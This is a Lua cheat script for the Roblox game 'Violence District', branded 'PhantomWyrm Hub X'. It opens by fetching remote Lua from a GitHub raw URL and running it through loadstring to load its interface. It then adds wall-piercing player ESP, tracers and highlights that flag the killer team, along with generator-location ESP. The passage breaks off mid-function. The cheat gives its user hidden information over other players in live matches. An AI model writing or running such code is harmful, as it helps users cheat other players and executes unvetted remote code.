local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/MODDEDFLUENT/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/MODDEDFLUENT/SaveManager.lua"))()
local FBM = loadstring(game:HttpGet("https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/MODDEDFLUENT/FloatingButton.Lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/inuaposzoawjsjs-glitch/.githubasset/refs/heads/master/MODDEDFLUENT/InterfaceManager.lua"))()

if not Fluent or not SaveManager or not InterfaceManager or not FBM then return game.Players.LocalPlayer:Kick("Error: Interface didn't load") end

if _G.PhantomWyrmXIsAlreadyRunning then
   game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Script is already running!",
        Text = ""
    })
   return
end

_G.PhantomWyrmXIsAlreadyRunning = true

local Window = Fluent:CreateWindow({
    Title = "PhantomWyrm Hub X - Violence District│Mobile",
    SubTitle = "1.6.5 Made By Carey",
    TabWidth = 160,
    Size = UDim2.fromOffset(540, 390),
    Acrylic = false,
    Theme = "Darker",
})

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "rbxassetid://7733960981" }),
    AutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "rbxassetid://10709811110" }),
    Combat = Window:AddTab({ Title = "Combat", Icon = "rbxassetid://10734975692" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "rbxassetid://7734068321" }),
    Visual = Window:AddTab({ Title = "Visual", Icon = "rbxassetid://10709819149" }),
    Info = Window:AddTab({ Title = "Info", Icon = "rbxassetid://10723415903" }),
    Settings = Window:AddTab({ Title = "Configuration", Icon = "rbxassetid://7734052335" }),
    Extension = Window:AddTab({ Title = "Extension", Icon = "rbxassetid://10734930886" })    
}

local Options = Fluent.Options

local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Lighting = game:GetService('Lighting')
local StarterGui = game:GetService("StarterGui")
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local CoreGui = game:GetService("CoreGui")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local PathfindingService = game:GetService("PathfindingService")
local CAS = game:GetService("ContextActionService")

local function GetAutoDuration()
    local dt = RunService.RenderStepped:Wait()
    local fps = 1 / dt

    local duration = 60 / math.clamp(fps, 5, 60)
    return math.clamp(duration, 1, 6)
end

local Duration = GetAutoDuration()

local openshit = Instance.new("ScreenGui")
openshit.Name = "openshit"
openshit.Parent = CoreGui
openshit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
openshit.ResetOnSpawn = false

local mainopen = Instance.new("TextButton")
mainopen.Name = "mainopen"
mainopen.Parent = openshit
mainopen.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
mainopen.BackgroundTransparency = 1
mainopen.Position = UDim2.new(0.101969875, 0, 0.110441767, 0)
mainopen.Size = UDim2.new(0, 64, 0, 42)
mainopen.Text = ""
mainopen.Visible = true

local mainopens = Instance.new("UICorner")
mainopens.Parent = mainopen

local SizeBackMulti = 0.1
local AssetsIcon = "rbxassetid://139104323768501"
local AssetsBackground = "rbxassetid://105334838921663"

-- === ROTATING BACKGROUND IMAGE 
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "RotatingBackground"
backgroundImage.Parent = mainopen
backgroundImage.Size = UDim2.new(2.3 + SizeBackMulti, 0, 2.3 + SizeBackMulti, 0)
backgroundImage.Position = UDim2.new(0.5, 0, 0.5, 0)
backgroundImage.AnchorPoint = Vector2.new(0.5, 0.5)
backgroundImage.BackgroundTransparency = 1
backgroundImage.Image = AssetsBackground
backgroundImage.SizeConstraint = Enum.SizeConstraint.RelativeXX
backgroundImage.ZIndex = 0

-- === STATIC FRONT IMAGE ===

local WIDTH = 0.85
local HEIGHT = 1
-- ====================================================

local frontImage = Instance.new("ImageLabel")
frontImage.Name = "StaticIcon"
frontImage.Parent = mainopen

frontImage.Size = UDim2.new(WIDTH, 0, HEIGHT, 0)
frontImage.Position = UDim2.new(0.5, 0, 0.5, 0)
frontImage.AnchorPoint = Vector2.new(0.5, 0.5)
frontImage.BackgroundTransparency = 1
frontImage.Image = AssetsIcon
frontImage.ZIndex = 1


frontImage.ScaleType = Enum.ScaleType.Stretch 



local frontCorner = Instance.new("UICorner")
frontCorner.CornerRadius = UDim.new(1, 0)
frontCorner.Parent = frontImage

local rotation = 0
local speed = 90 
local lastTime = tick()

task.spawn(function()
	while true do
		local now = tick()
		local delta = now - lastTime
		lastTime = now
		
		rotation = (rotation + speed * delta) % 360
		backgroundImage.Rotation = rotation

		task.wait()
	end
end)

local function MakeDraggable(topbarobject, object, locked)
    local Dragging = false
    local DragInput
    local DragStart
    local StartPosition

    local Holding = false
    local HoldTime = 1.0
    local MoveCancelThreshold = 6
    local HoldToken = 0

    object:SetAttribute("Locked", locked or false)

    local function Update(input)
        if object:GetAttribute("Locked") then return end
        local delta = input.Position - DragStart
        object.Position = UDim2.new(
            StartPosition.X.Scale,
            StartPosition.X.Offset + delta.X,
            StartPosition.Y.Scale,
            StartPosition.Y.Offset + delta.Y
        )
    end

    local function ToggleLock()
        local newState = not object:GetAttribute("Locked")
        object:SetAttribute("Locked", newState)

        Fluent:Notify({
            Title = newState and "Button Locked" or "Button Unlocked",
            Content = newState and "This button is now locked in place." or "This button can now be moved.",
            Duration = 2
        })
    end

    topbarobject.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1
        and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end

        Dragging = not object:GetAttribute("Locked")
        Holding = true
        DragStart = input.Position
        StartPosition = object.Position

        HoldToken += 1
        local token = HoldToken

        task.delay(HoldTime, function()
            if Holding and token == HoldToken then
                ToggleLock()
            end
        end)

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                Dragging = false
                Holding = false
            end
        end)
    end)

    topbarobject.InputChanged:Connect(function(input)
        if not DragStart then return end

        if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
            if (input.Position - DragStart).Magnitude > MoveCancelThreshold then
                Holding = false
            end
            DragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == DragInput and Dragging then
            Update(input)
        end
    end)
end

MakeDraggable(mainopen, mainopen, false)

local function playSound(soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://" .. soundId
    sound.Parent = game:GetService("SoundService")
    sound:Play()
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

mainopen.MouseButton1Click:Connect(function()
local sounds = { "7127123605", "137566474343039", "438666542", "257001341", "257000833", "7127123554", "131607746976396", "97325669841459", "109312518223078" }
    playSound(sounds[math.random(#sounds)])
    Window:Minimize()

    local function smoothSpeed(target, duration)
        local start = speed
        local steps = 30
        for i = 1, steps do
            speed = start + (target - start) * (i / steps)
            task.wait(duration / steps)
        end
        speed = target
    end
    
    smoothSpeed(360, 0.4)
    task.wait(0.5)
    smoothSpeed(180, 0.4)
    task.wait(0.3)
    smoothSpeed(90, 0.4)
end)


-- touch buttons

if not DFunctions then
    _G.DFunctions = {}
    DFunctions = _G.DFunctions
end

function DFunctions.CreateButton(a, b, c, d, e, f)
    local g = game:GetService("CoreGui")
    local h = Instance.new("ScreenGui")
    h.Name = a
    h.Parent = g
    h.ResetOnSpawn = false
    h.DisplayOrder = -2147483648
    h.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    h.IgnoreGuiInset = false
    
    local i = Instance.new("Frame")
    i.Name = a
    i.AnchorPoint = Vector2.new(0.5, 0.5)
    i.Position = UDim2.new(0.5, 0, 0.5, 0)
    
    if c < 1 and d < 1 then
        i.Size = UDim2.new(c, 0, d, 0)
    else
        i.Size = UDim2.new(0, c, 0, d)
    end
    
    i.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    i.BackgroundTransparency = 0.7
    i.ZIndex = -10
    i.Parent = h
    
    local j = Instance.new("UIGradient")
    if getgenv().ButtonGradients and getgenv().ButtonGradients.Background then
        j.Color = getgenv().ButtonGradients.Background
    else
        j.Color = ColorSequence.new(Color3.fromRGB(35, 35, 35), Color3.fromRGB(15, 15, 15))
    end
    j.Parent = i
    
    task.spawn(
        function()
            while task.wait(0.03) do
                if not i or not i.Parent then
                    break
                end
                j.Rotation = (j.Rotation + 1) % 360
                if getgenv().ButtonGradients and getgenv().ButtonGradients.Background then
                    j.Color = getgenv().ButtonGradients.Background
                end
            end
        end
    )
    
    local k = Instance.new("UIStroke")
    k.Thickness = 2
    k.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    k.Color = Color3.new(1, 1, 1)
    k.Parent = i
    
    local l = Instance.new("UIGradient")
    if getgenv().ButtonGradients and getgenv().ButtonGradients.Stroke then
        l.Color = getgenv().ButtonGradients.Stroke
    else
        l.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(100, 100, 100))
    end
    l.Rotation = 0
    l.Parent = k
    
    task.spawn(
        function()
            while task.wait(0.03) do
                if not i or not i.Parent then
                    break
                end
                l.Rotation = (l.Rotation + 0.5) % 360
                if getgenv().ButtonGradients and getgenv().ButtonGradients.Stroke then
                    l.Color = getgenv().ButtonGradients.Stroke
                end
            end
        end
    )
    
    local m = Instance.new("UICorner")
    m.CornerRadius = UDim.new(0, 15)
    m.Parent = i
    
    local n = Instance.new("TextButton")
    n.Size = UDim2.new(1, 0, 1, 0)
    n.BackgroundTransparency = 1
    n.Text = b
    n.Font = Enum.Font.SourceSansBold
    n.TextColor3 = Color3.fromRGB(255, 255, 255)
    n.TextSize = 24
    n.TextScaled = false
    n.ZIndex = -9
    n.Parent = i
    
    local o = Instance.new("TextButton")
    o.Size = UDim2.new(0, 28, 0, 28)
    o.Position = UDim2.new(1, 6, 0.5, -14)
    o.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    o.Text = "○"
    o.TextColor3 = Color3.fromRGB(255, 255, 255)
    o.Visible = false
    o.ZIndex = -8
    o.Parent = i
    
    local p = Instance.new("UICorner")
    p.CornerRadius = UDim.new(1, 0)
    p.Parent = o
    
    i:SetAttribute("OriginalSize", i.Size)
    i:SetAttribute("IsCircle", false)
    local q = f ~= nil and f or i:GetAttribute("IsCircle")
    
    
    local function r(s)
        i:SetAttribute("IsCircle", s)
        if s then
            
            local t = math.min(i.AbsoluteSize.X, i.AbsoluteSize.Y)
            if t == 0 then
            
                local camera = workspace.CurrentCamera
                local screenX = camera and camera.ViewportSize.X or 1920
                local screenY = camera and camera.ViewportSize.Y or 1080
                local pixelX = (c < 1) and (c * screenX) or c
                local pixelY = (d < 1) and (d * screenY) or d
                t = math.min(pixelX, pixelY)
            end
            if t == 0 then t = 50 end
            
            i.Size = UDim2.new(0, t, 0, t)
            n.TextWrapped = true
            n.TextScaled = true
            n.TextSize = math.clamp(math.floor(t * 0.45), 1, 100)
            m.CornerRadius = UDim.new(1, 0)
            o.Text = "▢"
        else
            i.Size = i:GetAttribute("OriginalSize") or UDim2.new(c, 0, d, 0)
            n.TextWrapped = false
            n.TextScaled = false
            n.TextSize = 24
            m.CornerRadius = UDim.new(0, 15)
            o.Text = "○"
        end
    end
    
    r(q)
    
    task.spawn(
        function()
            while task.wait(0.25) do
                if not i or not i.Parent then
                    break
                end
                if o.Visible and tick() - hideAt >= 10 then
                    o.Visible = false
                end
            end
        end
    )
    
    n.InputBegan:Connect(
        function(u)
            if u.UserInputType == Enum.UserInputType.MouseButton1 or u.UserInputType == Enum.UserInputType.Touch then
                holding = true
                holdStart = tick()
            end
        end
    )
    
    n.InputEnded:Connect(
        function(u)
            if holding and (u.UserInputType == Enum.UserInputType.MouseButton1 or u.UserInputType == Enum.UserInputType.Touch) then
                holding = false
                if tick() - holdStart >= 0.6 then
                    o.Visible = true
                    hideAt = tick()
                end
            end
        end
    )
    
    o.MouseButton1Click:Connect(
        function()
            hideAt = tick()
            local v = i:GetAttribute("IsCircle")
            r(not v)
        end
    )
    
    n.Activated:Connect(
        function()
            if e then
                local w, x = pcall(function() e(n) end)
                if not w then
                    warn("Error in Button Logic: " .. tostring(x))
                end
            end
        end
    )
    
    if FBM and FBM.AddButton then
        pcall(function() FBM:AddButton(a, i, false) end)
    end
    if typeof(MakeDraggable) == "function" then
        pcall(function() MakeDraggable(n, i, false) end)
    end
    return n
end


function DFunctions.UpdateButton(b, c, d)
    local g = game:GetService("CoreGui")
    local y = g:FindFirstChild(b)
    if y then
        local i = y:FindFirstChild(b)
        if i then
            local z
            if c < 1 and d < 1 then
                z = UDim2.new(c, 0, d, 0)
            else
                z = UDim2.new(0, c, 0, d)
            end
            
            
            i:SetAttribute("OriginalSize", z)
            
            local q = i:GetAttribute("IsCircle")
            if not q then
                
                i.Size = z
                local n = i:FindFirstChildOfClass("TextButton")
                if n then
                    n.TextWrapped = false
                    n.TextScaled = false
                    n.TextSize = 24
                end
            else
                
                local camera = workspace.CurrentCamera
                local screenX = camera and camera.ViewportSize.X or 1920
                local screenY = camera and camera.ViewportSize.Y or 1080
                
                local pixelX = (c < 1) and (c * screenX) or c
                local pixelY = (d < 1) and (d * screenY) or d
                
                
                local t = math.min(pixelX, pixelY)
                
                if t == 0 then t = 50 end   
             
                i.Size = UDim2.new(0, t, 0, t)
                                
                local n = i:FindFirstChildOfClass("TextButton")
                if n then
                    n.TextWrapped = true
                    n.TextScaled = true
                    n.TextSize = math.clamp(math.floor(t * 0.45), 1, 100)
                end
            end
        end
    end
end

function DFunctions.DestroyButton(b)
    local g = game:GetService("CoreGui")
    local y = g:FindFirstChild(b)
    if y then
        y:Destroy()
    end
end

-- FPS Counter

local Stats = game:GetService("Stats")
local RunService = game:GetService("RunService")

local startTime = tick()
local FPS_Data = {
    GUI = nil,
    Connection = nil
}

local function ToggleFPSCounter(state)
    if not state then
        if FPS_Data.GUI then
            FPS_Data.GUI:Destroy()
            FPS_Data.GUI = nil
        end
        if FPS_Data.Connection then
            FPS_Data.Connection:Disconnect()
            FPS_Data.Connection = nil
        end
        return
    end

    if state and not FPS_Data.GUI then
        local fpsCounter = Instance.new("ScreenGui")
        fpsCounter.Name = "FPSCounter"
        fpsCounter.Parent = game.CoreGui
        fpsCounter.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        fpsCounter.ResetOnSpawn = false
        FPS_Data.GUI = fpsCounter

        local frame = Instance.new("Frame")
        frame.Parent = fpsCounter
        frame.Size = UDim2.new(0, 180, 0, 80)
        frame.Position = UDim2.new(0, 300, 0, 10)
        frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        frame.BackgroundTransparency = 0.7

        local corner = Instance.new("UICorner", frame)
        corner.CornerRadius = UDim.new(0, 15)

        local gradient = Instance.new("UIGradient", frame)
        gradient.Color = getgenv().ButtonGradients.Background

        local uiStroke = Instance.new("UIStroke", frame)
        uiStroke.Thickness = 2
        uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

        local gradientstroke = Instance.new("UIGradient", uiStroke)
        gradientstroke.Color = getgenv().ButtonGradients.Stroke

    
        task.spawn(function()
            while fpsCounter and fpsCounter.Parent do
                gradient.Rotation = (gradient.Rotation + 1) % 360
                gradient.Color = getgenv().ButtonGradients.Background 
                task.wait(0.03)
            end
        end)

        task.spawn(function()
            while fpsCounter and fpsCounter.Parent do
                gradientstroke.Rotation = (gradientstroke.Rotation + 0.5) % 360
                gradientstroke.Color = getgenv().ButtonGradients.Stroke
                task.wait()
            end
        end)

        local label = Instance.new("TextLabel", frame)
        label.Size = UDim2.new(1, -10, 1, -10)
        label.Position = UDim2.new(0, 5, 0, 5)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Font = Enum.Font.GothamBlack
        label.TextSize = 12
        label.TextXAlignment = Enum.TextXAlignment.Center
        label.TextYAlignment = Enum.TextYAlignment.Center
        label.Text = "Loading..."

        if typeof(MakeDraggable) == "function" then
            MakeDraggable(frame, frame, false)
        end

        local lastUpdateTime = tick()
        local frameCount = 0

        FPS_Data.Connection = RunService.RenderStepped:Connect(function()
            frameCount = frameCount + 1
            local now = tick()
            local dt = now - lastUpdateTime

            if dt >= 1 then
                local fps = math.round(frameCount / dt)
                local elapsed = now - startTime
                local h = math.floor(elapsed / 3600)
                local m = math.floor((elapsed % 3600) / 60)
                local s = math.floor(elapsed % 60)
                
                local ping = 0
                pcall(function()
                    ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
                end)

                label.Text = string.format("FPS: %d | Ping: %d ms\nClient Timer: %dh %dm %ds", fps, ping, h, m, s)
                lastUpdateTime = now
                frameCount = 0
            end
        end)
    end
end

ToggleFPSCounter(true)

Tabs.Main:AddSection("Esp")

local a = game:GetService("Players")
local b = game:GetService("CoreGui")
local c = game:GetService("RunService")
local d = a.LocalPlayer
local e = workspace.CurrentCamera

local MAX_ESP_DISTANCE = 3000

local function f(g)
    local char = g.Character
    local humanoid = char and char:FindFirstChildOfClass("Humanoid")
    
    
    if g:GetAttribute("InMatch") == false or g:GetAttribute("InRound") == false or (humanoid and humanoid.MaxHealth == 0) then
        return Color3.fromRGB(120, 120, 120)
    end

   
    if d == g then
        return Color3.fromRGB(0, 255, 0)
    end

    
    if g.Team then
        local teamName = g.Team.Name:lower()
        
        
        if teamName:find("kill") or teamName:find("murd") or teamName:find("beast") or teamName:find("monst") or teamName:find("maniac") then
            return Color3.fromRGB(255, 0, 0)
        end
    end

   
    return Color3.fromRGB(0, 255, 0)
end


Tabs.Main:AddToggle(
    "PlayerBillboard",
    {
        Title = "Player Billboard ESP",
        Default = false,
        Callback = function(h)
            _G.PlayerBillboard = h
            local function i()
                for j, k in pairs(b:GetChildren()) do
                    if k.Name:find("CareyESP_") then
                        k:Destroy()
                    end
                end
            end
            local function l(g)
                if g == d then
                    return
                end
                local function m(n)
                    if b:FindFirstChild("CareyESP_" .. g.Name) then
                        b["CareyESP_" .. g.Name]:Destroy()
                    end
                    local o = n:WaitForChild("Head", 5)
                    if not o then
                        return
                    end
                    local p = Instance.new("BillboardGui")
                    p.Name = "CareyESP_" .. g.Name
                    p.Parent = b
                    p.Adornee = o
                    p.Size = UDim2.new(0, 200, 0, 50)
                    p.StudsOffset = Vector3.new(0, 3, 0)
                    p.AlwaysOnTop = true
                    
                    local q = Instance.new("TextLabel")
                    q.Parent = p
                    q.BackgroundTransparency = 1
                    q.Size = UDim2.new(1, 0, 1, 0)
                    q.Text = g.Name
                    q.TextColor3 = f(g)
                    q.Font = Enum.Font.RobotoMono
                    q.TextSize = 14
                    q.TextStrokeTransparency = 0
                    
                    task.spawn(
                        function()
                            while _G.PlayerBillboard and g.Parent and n.Parent and o.Parent do
                                local r = d.Character
                                local s = r and r:FindFirstChild("HumanoidRootPart")
                                local t = n:FindFirstChild("HumanoidRootPart")
                                if s and t then
                                    local u = math.floor((t.Position - s.Position).Magnitude)
                                    
                                    local _, onScreen = e:WorldToViewportPoint(o.Position)
                                    
                                    if u <= MAX_ESP_DISTANCE and onScreen then
                                        p.Enabled = true
                                        q.Text = string.format("%s\n[%d studs]", g.Name, u)
                                    else
                                        p.Enabled = false
                                    end
                                end
                                q.TextColor3 = f(g)
                                task.wait(0.2)
                            end
                            p:Destroy()
                        end
                    )
                end
                g.CharacterAdded:Connect(m)
                if g.Character then
                    task.spawn(m, g.Character)
                end
            end
            if h then
                for j, g in pairs(a:GetPlayers()) do
                    l(g)
                end
                _G.PlayerAddedConn = a.PlayerAdded:Connect(l)
            else
                if _G.PlayerAddedConn then
                    _G.PlayerAddedConn:Disconnect()
                end
                i()
            end
        end
    }
)

_G.TracerPosition = "Bottom"

Tabs.Main:AddDropdown("TracerPosDropdown", {
    Title = "Tracer Origin Position",
    Values = {"Top", "Center", "Bottom"},
    CurrentValue = "Bottom",
    Multi = false,
    Callback = function(SelectedMode)
        _G.TracerPosition = SelectedMode
    end
})

Tabs.Main:AddToggle(
    "PlayerTracers",
    {
        Title = "Player Tracers",
        Default = false,
        Callback = function(h)
            _G.PlayerTracers = h
            local function v(g)
                if g == d then
                    return
                end
                local w = Drawing.new("Line")
                w.Visible = false
                w.Color = f(g)
                w.Thickness = 1
                w.Transparency = 0.8
                local x
                x =
                    c.RenderStepped:Connect(
                    function()
                        if _G.PlayerTracers and g.Character and g.Character:FindFirstChild("HumanoidRootPart") then
                            local y = g.Character.HumanoidRootPart
                            local r = d.Character
                            local s = r and r:FindFirstChild("HumanoidRootPart")
                            
                            local dist = s and math.floor((y.Position - s.Position).Magnitude) or 0
                            
                            if dist <= MAX_ESP_DISTANCE then
                                local z, A = e:WorldToViewportPoint(y.Position)
                                if A then
                                    if _G.TracerPosition == "Top" then
                                        w.From = Vector2.new(e.ViewportSize.X / 2, 0)
                                    elseif _G.TracerPosition == "Center" then
                                        w.From = Vector2.new(e.ViewportSize.X / 2, e.ViewportSize.Y / 2)
                                    else
                                        w.From = Vector2.new(e.ViewportSize.X / 2, e.ViewportSize.Y)
                                    end
                                    
                                    w.To = Vector2.new(z.X, z.Y)
                                    w.Color = f(g)
                                    w.Visible = true
                                else
                                    w.Visible = false
                                end
                            else
                                w.Visible = false
                            end
                        else
                            w.Visible = false
                            if not _G.PlayerTracers or not g.Parent then
                                w:Remove()
                                x:Disconnect()
                            end
                        end
                    end
                )
            end
            if h then
                for j, g in pairs(a:GetPlayers()) do
                    v(g)
                end
                _G.TracerPlayerAddedConn = a.PlayerAdded:Connect(v)
            else
                if _G.TracerPlayerAddedConn then
                    _G.TracerPlayerAddedConn:Disconnect()
                end
            end
        end
    }
)

_G.PlayerHighlight = false
_G.HighlightOutline = false

local function CreateHighlightESP(Name, Part, HighlightColor, OutlineColor, ShowHighlight)
  if not Part then return false end
  local Highlight = Instance.new("Highlight")
  Highlight.Name = Name
  Highlight.FillColor = HighlightColor or Color3.fromRGB(255, 255, 255)
  Highlight.OutlineColor = OutlineColor or Color3.fromRGB(0, 0, 0)
  Highlight.FillTransparency = ShowHighlight and 1 or 0.5
  Highlight.OutlineTransparency = (_G.PlayerHighlight and _G.HighlightOutline) and 0 or 1
  Highlight.Parent = Part
  Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
  return true
end

local function UpdateHighlightESP(Name, Part, HighlightColor, OutlineColor, ShowHighlight)
  local Highlight = Part and Part:FindFirstChild(Name)
  if not Highlight or not Highlight:IsA("Highlight") then return false end
  if HighlightColor then Highlight.FillColor = HighlightColor end
  if OutlineColor then Highlight.OutlineColor = OutlineColor end
  if ShowHighlight ~= nil then
    Highlight.FillTransparency = ShowHighlight and 1 or 0.5
  end
  Highlight.OutlineTransparency = (_G.PlayerHighlight and _G.HighlightOutline) and 0 or 1
  return true
end

local function DestroyHighlightESP(Name, Part)
  local Highlight = Part and Part:FindFirstChild(Name)
  if Highlight and Highlight:IsA("Highlight") then
    Highlight:Destroy()
    return true
  end
  return false
end

Tabs.Main:AddToggle(
    "PlayerHighlight",
    {
        Title = "Player Highlight",
        Default = false,
        Callback = function(h)
            _G.PlayerHighlight = h
            
            local function B(g)
                if g == d then
                    return
                end
                local function C(n)
                    DestroyHighlightESP("CareyHighlight", n)
                    local E = f(g)
                    CreateHighlightESP("CareyHighlight", n, E, E, _G.HighlightOutline)
                    
                    local D = n:FindFirstChild("CareyHighlight")
                    
                    task.spawn(
                        function()
                            while g.Parent and n.Parent and D and D.Parent do
                                if _G.PlayerHighlight then
                                    local r = d.Character
                                    local s = r and r:FindFirstChild("HumanoidRootPart")
                                    local t = n:FindFirstChild("HumanoidRootPart")
                                    
                                    if s and t then
                                        local dist = math.floor((t.Position - s.Position).Magnitude)
                                        if dist <= MAX_ESP_DISTANCE then
                                            D.Enabled = true
                                            local F = f(g)
                                            UpdateHighlightESP("CareyHighlight", n, F, F, _G.HighlightOutline)
                                        else
                                            D.Enabled = false
                                        end
                                    else
                                        D.Enabled = true
                                        local F = f(g)
                                        UpdateHighlightESP("CareyHighlight", n, F, F, _G.HighlightOutline)
                                    end
                                else
                                    D.Enabled = false
                                end
                                task.wait(1.5)
                            end
                            DestroyHighlightESP("CareyHighlight", n)
                        end
                    )
                end
                g.CharacterAdded:Connect(C)
                if g.Character then
                    C(g.Character)
                end
            end
            
            if h then
                for j, g in pairs(a:GetPlayers()) do
                    B(g)
                end
                if not _G.HighlightPlayerAddedConn then
                    _G.HighlightPlayerAddedConn = a.PlayerAdded:Connect(B)
                end
            else
                if _G.HighlightPlayerAddedConn then
                    _G.HighlightPlayerAddedConn:Disconnect()
                    _G.HighlightPlayerAddedConn = nil
                end
                for j, g in pairs(a:GetPlayers()) do
                    if g.Character then
                        DestroyHighlightESP("CareyHighlight", g.Character)
                    end
                end
            end
        end
    }
)

Tabs.Main:AddToggle(
    "HighlightOutline",
    {
        Title = "Highlight Outline",
        Default = false,
        Callback = function(h)
            _G.HighlightOutline = h
            
            for j, g in pairs(a:GetPlayers()) do
                if g.Character then
                    local F = f(g)
                    UpdateHighlightESP("CareyHighlight", g.Character, F, F, _G.HighlightOutline)
                end
            end
        end
    }
)

Tabs.Main:AddSection("Objectives")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer
local camera = workspace.CurrentCamera
local MAX_ESP_DISTANCE = 3000

local cachedGenerators = {}
local activeTracers = {}
local activeBillboards = {}
local activeHighlights = {}

local function isGenerator(model)
    if not model or not model:IsA("Model") then return false end
    if Players:GetPlayerFromCharacter(model) then return false end
    if cachedGenerators[model] ~= nil then return cachedGenerators[model] end
    
    local name = model.Name:lower()
    if name:find("generator") or name:find("repair") or name:find("engine") then
        cachedGenerators[model] = true
        return true
    end
    
    if model:GetAttribute("Progress") or model:GetAttribute("RepairProgress") or model:GetAttribute("Completed") or model:GetAttribute("Activated") then
        cachedGenerators[model] = true
        return true
    end
    
    return false
end

local function getGenColor(genModel)
    if genModel:GetAttribute("Completed") or genModel:GetAttribute("Activated") or genModel:GetAttribute("Done") then
        return Color3.fromRGB(120, 120, 120)
    end
    return Color3.fromRGB(0, 255, 255)
end

local function getGenProgress(genModel)
    local progress = genModel:GetAttribute("Progress") or genModel:GetAttribute("RepairProgress") or 0
    if progress <= 1 and progress > 0 then progress = progress * 100 end
    return math.clamp(math.floor(progress), 0, 100)
end

local function findAnyVisualPart(model)
    if model:IsA("BasePart") then return model end
    return model:FindFirstChildWhichIsA("MeshPart", true) or model:FindFirstChildWhichIsA("Part", true) or model.PrimaryPart
end

local function scanWorkspace()
    for _, obj in pairs(workspace:GetDescendants()) do
        local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
        if model and isGenerator(model) then
            cachedGenerators[model] = true
        end
    end
end

scanWorkspace()

local function createBillboardForModel(model)
    if not model.Parent or activeBillboards[model] then return end
    local part = findAnyVisualPart(model)
    if part then
        local p = Instance.new("BillboardGui", model)
        p.Name = "GenWorkspaceBillboard"
        p.Adornee = part
        p.Size = UDim2.new(0, 200, 0, 50)
        p.StudsOffset = Vector3.new(0, 4, 0)
        p.AlwaysOnTop = true
        
        local q = Instance.new("TextLabel", p)
        q.BackgroundTransparency = 1
        q.Size = UDim2.new(1, 0, 1, 0)
        q.TextColor3 = Color3.new(1, 1, 1)
        q.TextStrokeTransparency = 0
        
        activeBillboards[model] = p
        
        task.spawn(function()
            while _G.GenBillboard and model.Parent do
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local dist = root and (part.Position - root.Position).Magnitude or MAX_ESP_DISTANCE
                
                p.Enabled = dist < MAX_ESP_DISTANCE
                q.Text = "Gen ["..getGenProgress(model).."%]"
                q.TextColor3 = getGenColor(model)
                task.wait(0.5)
            end
            p:Destroy()
            activeBillboards[model] = nil
        end)
    end
end

local function createHighlightForModel(model)
    if not model.Parent then return end
    local hl = activeHighlights[model] or model:FindFirstChild("GenHighlightInstance")
    if not hl then
        hl = Instance.new("Highlight", model)
        hl.Name = "GenHighlightInstance"
    end
    hl.Enabled = true
    hl.FillColor = getGenColor(model)
    activeHighlights[model] = hl
    
    task.spawn(function()
        while _G.GenHighlight and hl and hl.Parent do
            hl.FillColor = getGenColor(model)
            task.wait(0.5)
        end
    end)
end

workspace.DescendantAdded:Connect(function(obj)
    local model = obj:IsA("Model") and obj or obj:FindFirstAncestorOfClass("Model")
    if model and isGenerator(model) then
        cachedGenerators[model] = true
        if _G.GenBillboard then
            createBillboardForModel(model)
        end
        if _G.GenHighlight then
            createHighlightForModel(model)
        end
    end
end)

Tabs.Main:AddToggle("GeneratorBillboard", {
    Title = "Generator Billboard ESP",
    Default = false,
    Callback = function(Value)
        _G.GenBillboard = Value
        if not Value then
            for model, p in pairs(activeBillboards) do
                if p then p:Destroy() end
            end
            table.clear(activeBillboards)
            return
        end
        
        scanWorkspace()
        for model, _ in pairs(cachedGenerators) do
            createBillboardForModel(model)
        end
    end
})

Tabs.Main:AddToggle("GeneratorTracers", {
    Title = "Generator Tracers",
    Default = false,
    Callback = function(Value)
        _G.GenTracers = Value
        if not Value then
            for _, v in pairs(activeTracers) do v:Remove() end
            table.clear(activeTracers)
            if _G.GenTracerLoop then _G.GenTracerLoop:Disconnect() end
            return
        end
        
        scanWorkspace()
        _G.GenTracerLoop = RunService.RenderStepped:Connect(function()
            local char = localPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if not root then
                for _, line in pairs(activeTracers) do line.Visible = false end
                return 
            end
            
            for model, _ in pairs(cachedGenerators) do
                if model.Parent then
                    if not activeTracers[model] then
